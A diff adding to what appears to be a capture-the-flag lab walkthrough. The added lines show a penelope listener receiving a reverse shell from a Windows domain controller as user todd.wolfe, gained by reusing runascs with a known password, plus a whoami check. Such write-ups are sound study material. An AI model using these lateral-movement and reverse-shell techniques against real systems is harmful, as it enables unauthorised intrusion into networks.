@@ -375,5 +375,18 @@ penelope -p 1338
 I can now reuse runascs to get a session as todd.wofle since i already know his password
 
 ```python
-
+penelope -p 1338     
+[+] Listening for reverse shells on 0.0.0.0:1338 -> 127.0.0.1 • 192.168.1.157 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => DC 10.129.232.130 Microsoft_Windows_Server_2022_Standard-x64-based_PC 👤 voleur\todd.wolfe 😍️ Session ID <1>
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/DC~10.129.232.130-Microsoft_Windows_Server_2022_Standard-x64-based_PC/2026_04_06-15_07_11-552.log
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+PS C:\Windows\system32> whoami
+whoami
+voleur\todd.wolfe
+PS C:\Windows\system32> 
 ```
+Now i have access as `todd.wolfe`
+
